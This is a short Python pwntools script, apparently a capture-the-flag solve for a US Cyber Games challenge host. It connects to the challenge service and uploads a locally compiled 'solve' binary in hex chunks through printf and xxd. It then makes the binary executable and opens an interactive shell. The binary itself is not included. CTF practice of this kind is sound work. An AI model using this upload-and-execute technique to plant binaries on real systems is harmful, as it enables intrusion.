#!/usr/bin/env python3  
# filepath: pure_solve.py
from pwn import *
import struct

def main():
    # if len(sys.argv) != 3:
    #     log.error("Usage: python3 pure_solve.py <host> <port>")
    #     sys.exit(1)
    
    # host = sys.argv[1] 
    # port = int(sys.argv[2])
    # challenge.ctf.uscybergames.com 53153
    host = "challenge.ctf.uscybergames.com"
    port = 53153
    
    # Connect and get shell
    log.info(f"Connecting to {host}:{port}")
    conn = remote(host, port, level='debug')
    
    conn.recvuntil(b"tip: Run \"stty -echo\"", timeout=10)
    conn.sendline(b"stty -echo")
    sleep(1)
    conn.sendline(b"export PS1='$ '")
    conn.recvuntil(b"$ ", timeout=5)
    
    # Create solve inline using printf/xxd
    log.info("Creating solve binary on target...")
    
    # Read the compiled solve and convert to hex
    with open('./solve', 'rb') as f:
        solve_data = f.read()
    
    hex_data = solve_data.hex()
    
    # Upload using printf and xxd reverse
    chunk_size = 2000  # Smaller chunks for printf
    chunks = [hex_data[i:i+chunk_size] for i in range(0, len(hex_data), chunk_size)]
    
    conn.sendline(b"rm -f solve")
    conn.recvuntil(b"$ ", timeout=2)
    
    for i, chunk in enumerate(chunks):
        if i == 0:
            cmd = f"printf '{chunk}' | xxd -r -p > solve"
        else:
            cmd = f"printf '{chunk}' | xxd -r -p >> solve"
        
        conn.sendline(cmd.encode())
        conn.recvuntil(b"$ ", timeout=2)
        log.info(f"Uploaded chunk {i+1}/{len(chunks)}")
    
    conn.sendline(b"chmod +x solve")
    conn.recvuntil(b"$ ", timeout=2)
    
    # # Run solve
    # log.info("Running solve...")
    # conn.sendline(b"solve")
    
    # solve_output = conn.recvuntil(b"$ ", timeout=10)
    # log.success("solve output:")
    # print(solve_output.decode('utf-8', errors='ignore'))
    
    # # Interactive shell
    # log.success("Interactive shell ready!")
    conn.interactive()

if __name__ == "__main__":
    main()